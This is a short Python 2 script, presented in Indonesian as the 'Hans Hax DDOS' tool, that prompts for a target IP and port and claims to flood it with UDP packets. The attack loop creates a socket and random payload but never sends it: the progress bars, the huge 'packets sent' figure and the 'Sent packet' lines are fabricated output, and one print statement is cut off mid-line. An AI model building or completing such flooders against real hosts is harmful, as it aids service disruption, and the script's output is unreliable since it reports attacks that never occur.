import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

#jangan mengubah command dibawah ini

os.system("clear")
os.system("figlet Hans Hax DDOS")
print
print "-----------------------------]"
print "Author    : Hans Hax"
print "Contact me: +6287850013150"
print "Thanks To : HansHax"
print "-----------------------------]"
print "Peringatan! Jika Kalian tidak memahami DDoS, lebih baik pelaja>
print
ip = raw_input("IP Target : ")
port = input("Port        : ")

os.system("clear")
os.system("figlet Mulai Menyerang Target")
print "[                    ] 0% "
time.sleep(5)
print "[=                   ] 10% "
time.sleep(9)
print "[=====               ] 25%"
time.sleep(8)
print "[==========          ] 50%"
time.sleep(10)
print "[===============     ] 75%"
time.sleep(9)
print "[====================] 100%"
time.sleep(3)
print "paket yang terkirim 9999999999999999999999999"
time.sleep(2)
os.system("clear")
print "mengirim paket ke Target"
time.sleep(2)
sent = 0
while True:
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1